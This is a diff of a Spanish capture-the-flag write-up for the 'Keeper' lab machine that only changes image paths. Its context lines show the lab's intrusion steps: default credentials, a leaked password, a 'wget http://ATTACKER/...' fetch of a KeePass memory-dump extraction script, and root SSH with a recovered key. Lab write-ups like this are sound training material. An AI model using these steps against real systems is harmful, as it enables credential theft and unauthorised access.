@@ -22,7 +22,7 @@ Puertos abiertos:
 * 80 (HTTP)
 * 22 (SSH)
 
-![Nmap](../assets/images/keeper/1.png)
+![Nmap](/images/keeper_1.png)
 
 La web redirige a:
 
@@ -46,7 +46,7 @@ Añadimos:
 10.10.11.227 tickets.keeper.htb
 ```
 
-![Hosts](../assets/images/keeper/2.png)
+![Hosts](/images/keeper_2.png)
 
 ---
 
@@ -67,7 +67,7 @@ pass: password
 
 👉 Acceso conseguido.
 
-![Login](../assets/images/keeper/3.png)
+![Login](/images/keeper_3.png)
 
 ---
 
@@ -85,7 +85,7 @@ Comentario interesante:
 Welcome2023!
 ```
 
-![Leak](../assets/images/keeper/4.png)
+![Leak](/images/keeper_4.png)
 
 ---
 
@@ -116,7 +116,7 @@ Contenido:
 * KeePassDumpFull.dmp
 * passcodes.kdbx
 
-![Files](../assets/images/keeper/5.png)
+![Files](/images/keeper_5.png)
 
 ---
 
@@ -143,7 +143,7 @@ wget http://ATTACKER/keepass_dump.py
 python3 keepass_dump.py -f KeePassDumpFull.dmp
 ```
 
-![Dump](../assets/images/keeper/6.png)
+![Dump](/images/keeper_6.png)
 
 ---
 
@@ -167,7 +167,7 @@ wget http://victim:8080/passcodes.kdbx
 
 Abrir con la passphrase.
 
-![KeePass](../assets/images/keeper/7.png)
+![KeePass](/images/keeper_7.png)
 
 ---
 
@@ -189,7 +189,7 @@ chmod 600 id_rsa
 ssh -i id_rsa root@10.10.11.227
 ```
 
-![Root](../assets/images/keeper/8.png)
+![Root](/images/keeper_8.png)
 
 ---
 
